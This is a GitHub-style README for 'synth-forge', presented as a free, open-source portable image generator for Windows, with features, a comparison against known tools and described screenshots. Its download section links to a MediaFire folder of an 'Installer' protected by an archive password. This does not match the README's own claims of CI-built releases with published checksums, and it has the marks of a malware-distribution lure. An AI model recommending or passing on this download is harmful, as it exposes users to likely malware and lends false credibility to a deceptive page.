# synth-forge

⚗️ Free, open-source local image generation studio for Windows — batch prompts, seeds, img2img. 100 MB portable, offline, MIT, no queue.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Batch prompt runs** — a CSV of prompts and seeds generates overnight into an organized gallery
- ✅ **Style presets** — photographic, illustration and poster looks applied as prompt modifiers, editable
- ✅ **Image-to-image** — strength dial and denoise control take an existing image in a new direction
- ✅ **Seed control** — lock a seed to iterate one detail without losing the composition
- ✅ **VRAM-safe presets** — resolution and step budgets that fit common cards with an honest error when they do not
- ✅ **Gallery with metadata** — every output stores its prompt, seed and settings in a sidecar
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why synth-forge

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **synth-forge** | Automatic1111 | ComfyUI | Fooocus |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free, OSS | Free, OSS |
| Open source | **Yes** | Yes | Yes | Yes |
| Install weight | **100 MB exe** | Multi-GB Python env | Multi-GB Python env | Multi-GB download
| Batch from CSV | **Yes** | Scripted | Workflow | No |
| Node graphs to learn | **No** | No | Yes | No |
| Portable, no install | **Yes** | No | Partial | Partial

## FAQ

**lightweight local image generator for Windows without a Python setup?**

The big open-source generators work, but they arrive as multi-gigabyte Python stacks that break on updates. synth-forge keeps the interface to a prompt box, style presets and a batch queue while models download separately. It is a 100 MB portable exe, MIT, offline, and the gallery keeps every setting in a sidecar.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark forge (#121417, orange #F97316): prompt bar at top with style chips, generated grid of four images below, seed and step controls in the right rail.
2. Batch CSV view: 60 prompt rows loaded with per-row thumbnails as they complete, progress at 22 of 60, overnight mode toggle lit.
3. Image-to-image panel: source image preview, strength dial at 0.55, side-by-side result, metadata sidecar chip listing seed and sampler.

## Download

| Source | Link |
|---|---|
| 💾 **Installer synth-forge** | [Installer synth-forge](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).